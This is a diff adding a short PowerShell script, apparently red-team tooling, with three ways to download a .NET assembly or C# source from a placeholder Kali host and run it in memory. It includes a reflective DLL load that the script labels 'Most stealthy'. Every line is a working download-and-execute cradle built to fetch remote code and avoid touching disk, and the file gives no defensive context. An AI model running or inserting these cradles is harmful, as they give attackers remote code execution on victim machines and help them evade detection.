@@ -1,0 +1,16 @@
+# Load and execute .NET assembly from remote server
+$url = 'http://<Kali_IP>:8080/recon.cs'
+$code = (New-Object Net.WebClient).DownloadString($url)
+Add-Type -TypeDefinition $code -Language CSharp
+[ReconTool]::Execute()
+
+# Alternative: Load pre-compiled DLL
+$url = 'http://<Kali_IP>:8080/recon.dll'
+$bytes = (New-Object Net.WebClient).DownloadData($url)
+[System.Reflection.Assembly]::Load($bytes)
+[ReconTool]::Execute()
+
+# Most stealthy: Inline reflection
+$url = 'http://<Kali_IP>:8080/recon.dll'
+$a=[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData($url))
+$a.GetType('ReconTool').GetMethod('Execute').Invoke($null,$null)
